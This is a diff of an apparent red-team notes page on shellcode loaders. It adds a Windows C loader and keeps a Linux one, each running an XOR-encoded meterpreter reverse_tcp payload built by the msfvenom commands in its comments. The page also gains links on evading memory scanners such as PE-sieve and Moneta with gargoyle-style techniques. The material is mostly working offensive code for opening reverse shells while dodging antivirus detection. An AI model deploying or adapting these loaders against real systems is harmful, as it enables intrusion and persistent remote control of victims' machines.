@@ -15,12 +15,34 @@
 - [https://github.com/byt3bl33d3r/OffensiveNim/issues/16](https://github.com/byt3bl33d3r/OffensiveNim/issues/16)
 - [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Loaders/simpleLoader.c](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Loaders/simpleLoader.c)
 
-Linux example. Compile allowing execution on stack:
+{% tabs %}
+{% tab title="Windows" %}
+{% code title="loader.c" %}
+```c
+#include <stdio.h>
+#include <windows.h>
 
-```
-$ gcc -o loader loader.c -z execstack
-```
+// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 -f raw -o met.bin --encrypt xor --encrypt-key a
+// xxd -i met.bin > shellcode.h
+#include "shellcode.h"
 
+int main() {
+    DWORD lpThreadId = 0;
+    DWORD flOldProtect = 0;
+    int bufsize = sizeof(buf);
+    LPVOID f = VirtualAlloc(NULL, bufsize, MEM_RESERVER|MEM_COMMIT, PAGE_READWRITE);
+    for (int i = 0; i < (int)bufsize-1; i++) { buf[i] = buf[i] ^ 'a'; }
+    memcpy(f, buf, bufsize);
+    VirtualProtect(f, bufsize, PAGE_EXECUTE_READ, &flOldProtect);
+    ((void(*)())f)();
+    //VirtualFree(f, 0, MEM_RELEASE);
+    WaitForSingleObject((HANDLE)-1, -1);
+    return 0;
+}
+```
+{% endcode %}
+{% endtab %}
+{% tab title="Linux" %}
 {% code title="loader.c" %}
 ```c
 #include <stdio.h>
@@ -29,7 +51,7 @@ $ gcc -o loader loader.c -z execstack
 
 // msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 -f c -o met.c --encrypt xor --encrypt-key a
 unsigned char buf[] = 
-"\x31\x33...\x33\x37";
+"\x31\x33\...\x33\x37";
 
 int main (int argc, char **argv)
 {
@@ -40,6 +62,14 @@ int main (int argc, char **argv)
 }
 ```
 {% endcode %}
+
+Compile allowing execution on stack:
+
+```
+$ gcc -o loader loader.c -z execstack
+```
+{% endtab %}
+{% endtabs %}
 
 
 
@@ -54,8 +84,17 @@ int main (int argc, char **argv)
 - [https://xz.aliyun.com/t/9399](https://xz.aliyun.com/t/9399)
 - [https://github.com/zu1k/beacon_hook_bypass_memscan](https://github.com/zu1k/beacon_hook_bypass_memscan)
 - [https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html](https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html)
+
+
+
+### gargoyle
+
 - [https://github.com/JLospinoso/gargoyle](https://github.com/JLospinoso/gargoyle)
+- [https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html](https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html)
 - [https://labs.f-secure.com/blog/experimenting-bypassing-memory-scanners-with-cobalt-strike-and-gargoyle/](https://labs.f-secure.com/blog/experimenting-bypassing-memory-scanners-with-cobalt-strike-and-gargoyle/)
+- [https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/](https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/)
+- [https://github.com/waldo-irc/YouMayPasser](https://github.com/waldo-irc/YouMayPasser)
+- [https://github.com/thefLink/DeepSleep](https://github.com/thefLink/DeepSleep)
 
 
 
